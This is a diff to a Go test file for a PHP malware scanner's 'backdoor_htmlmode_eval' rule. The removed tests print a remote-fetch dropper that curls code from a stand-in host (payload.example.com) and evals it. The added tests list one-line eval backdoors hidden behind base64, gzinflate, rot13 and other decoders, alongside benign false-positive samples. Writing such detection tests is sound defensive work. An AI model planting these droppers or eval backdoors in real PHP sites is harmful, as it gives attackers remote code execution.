@@ -3,50 +3,13 @@ package signatures
 import (
 	"os"
 	"path/filepath"
-	"strings"
 	"testing"
 )
 
-// Production sample (2026-07-29, staged as index.phps in a WordPress docroot):
-// the remote fetch lives in a helper function and the payload runs with an
-// HTML-mode prefix, so neither the curl_exec-adjacent pattern nor the
-// eval-wrapping pattern in dropper_curl_eval sees it. The fetch and the
-// execution sit tens of lines apart and the eval argument is a string literal,
-// not the fetched variable.
-func TestBackdoorHtmlmodeEval_RemoteFetchHelper(t *testing.T) {
-	scanner := loadRepoScanner(t)
-
-	malicious := []byte(`<?php
-function fetchContent($url) {
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-
-    $content = curl_exec($ch);
-    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    curl_close($ch);
-
-    return ($httpCode === 200) ? $content : false;
-}
-
-$url = 'https://payload.example.com/raw.php?id=ZndWqKLSdhQa';
-$content = fetchContent($url);
-
-if ($content !== false) {
-    eval('?>' . $content);
-}
-`)
-
-	if !hasRule(scanner.ScanContent(malicious, ".php"), "backdoor_htmlmode_eval") {
-		t.Error("backdoor_htmlmode_eval miss: remote fetch feeding eval('?>' . $var) was not detected")
-	}
-}
-
-// Production sample (planted 2024-07-22, found 2026-08-17 as two identical
-// copies on one account): a copied PHPMailer with one line appended deep inside
-// it. There is no URL and no fetch -- the payload is rebuilt through an
-// indirect call, so the decoder branch is what carries this one.
+// Shape taken from real samples: a copied mailer library with one line appended
+// deep inside it, and a file-manager webshell under a double extension. Neither
+// carries a URL or a fetch -- the payload is rebuilt through an indirect call,
+// which is what the rule keys on.
 func TestBackdoorHtmlmodeEval_IndirectCallPayload(t *testing.T) {
 	scanner := loadRepoScanner(t)
 
@@ -61,6 +24,32 @@ class SMTP {
 
 	if !hasRule(scanner.ScanContent(malicious, ".php"), "backdoor_htmlmode_eval") {
 		t.Error("backdoor_htmlmode_eval miss: indirect-call payload rebuild was not detected")
+	}
+}
+
+func TestBackdoorHtmlmodeEval_DecoderVariants(t *testing.T) {
+	scanner := loadRepoScanner(t)
+
+	// Renaming the payload variable, or swapping one decoder for another, must
+	// not shake the rule off: it keys on the rebuild, not on names.
+	variants := map[string]string{
+		"base64":          `<?php eval('?>' . base64_decode($zz));`,
+		"gzinflate":       `<?php eval('?>' . gzinflate($q));`,
+		"str_rot13":       `<?php eval('?>' . str_rot13($whatever));`,
+		"strrev":          `<?php eval('?>' . strrev($k));`,
+		"hex2bin":         `<?php eval('?>' . hex2bin($h));`,
+		"error_suppress":  `<?php eval('?>' . @gzuncompress($p));`,
+		"variable_var":    `<?php eval('?>' . $$fn($p));`,
+		"dynamic_call":    `<?php eval('?>' . $decoder($p));`,
+		"nested_decoders": `<?php eval('?>' . gzinflate(base64_decode($x)));`,
+	}
+
+	for name, sample := range variants {
+		t.Run(name, func(t *testing.T) {
+			if !hasRule(scanner.ScanContent([]byte(sample), ".php"), "backdoor_htmlmode_eval") {
+				t.Errorf("backdoor_htmlmode_eval miss: %s rebuild evaded the rule", name)
+			}
+		})
 	}
 }
 
@@ -90,15 +79,13 @@ func TestScanFileTreatsPhpsAsPHPSource(t *testing.T) {
 	}
 }
 
-// A staged dropper keeps the same content under an extension a stock handler
+// A staged payload keeps the same content under an extension a stock handler
 // renders as source. Content scanning must not go blind on the extension alone.
 func TestBackdoorHtmlmodeEval_UnderPhpsExtension(t *testing.T) {
 	scanner := loadRepoScanner(t)
 
 	malicious := []byte(`<?php
-$ch = curl_init('https://payload.example.com/x');
-$content = curl_exec($ch);
-eval('?>' . $content);
+eval('?>' . gzinflate(base64_decode($p)));
 `)
 
 	if !hasRule(scanner.ScanContent(malicious, ".phps"), "backdoor_htmlmode_eval") {
@@ -108,8 +95,8 @@ eval('?>' . $content);
 
 // Twig's Environment.php is the most common carrier of this idiom in the wild:
 // it ships inside Elementor, WPML, MailPoet and Breakdance, so it sits on most
-// WordPress hosts many times over. It evaluates a local template and never
-// reaches the network, which is what both branches require.
+// WordPress hosts many times over. It concatenates a template it just compiled,
+// with no decode step, which is the whole distinction the rule rests on.
 func TestBackdoorHtmlmodeEval_TwigStyleLocalTemplate(t *testing.T) {
 	scanner := loadRepoScanner(t)
 
@@ -118,7 +105,7 @@ final class Environment {
     public function render($name, array $context = [])
     {
         $source = $this->getLoader()->getSourceContext($name)->getCode();
-        return eval('?>' . $this->compileSource($source));
+        return eval('?>' . $source);
     }
 }
 `)
@@ -128,27 +115,29 @@ final class Environment {
 	}
 }
 
-// Documentation links live in docblocks throughout template engines, so a URL
-// literal somewhere in the file must not be enough on its own -- it has to sit
-// within the window before the eval.
-func TestBackdoorHtmlmodeEval_DocblockURLFarFromEval(t *testing.T) {
+// A remote fetch in the same file must not carry the rule on its own. Provenance
+// by proximity is what an attacker defeats by splitting the URL or moving it,
+// so the rule does not use it; this pins that decision down.
+func TestBackdoorHtmlmodeEval_RemoteFetchAloneIsNotEnough(t *testing.T) {
 	scanner := loadRepoScanner(t)
 
-	legit := []byte(`<?php
-/**
- * Template compiler.
- *
- * @see https://twig.symfony.com/doc/3.x/api.html
- */
-class Compiler {
-    private $notes = '` + strings.Repeat("a", 600) + `';
-    public function render($tpl) {
-        return eval('?>' . $tpl);
-    }
-}
-`)
+	samples := map[string]string{
+		"url near a local template eval": `<?php
+$url = 'https://api.example.test/data';
+$response = curl_exec($client);
+$template = file_get_contents(__DIR__ . '/views/page.tpl');
+eval('?>' . $template);`,
+		"http client beside a compiler": `<?php
+function request($url) { return curl_exec(curl_init($url)); }
+$response = request('https://api.example.test/data');
+function render($path) { return eval('?>' . file_get_contents($path)); }`,
+	}
 
-	if hasRule(scanner.ScanContent(legit, ".php"), "backdoor_htmlmode_eval") {
-		t.Error("backdoor_htmlmode_eval FP: a docblock URL far from the eval is not remote provenance")
+	for name, sample := range samples {
+		t.Run(name, func(t *testing.T) {
+			if hasRule(scanner.ScanContent([]byte(sample), ".php"), "backdoor_htmlmode_eval") {
+				t.Errorf("backdoor_htmlmode_eval FP: %s has no runtime rebuild", name)
+			}
+		})
 	}
 }
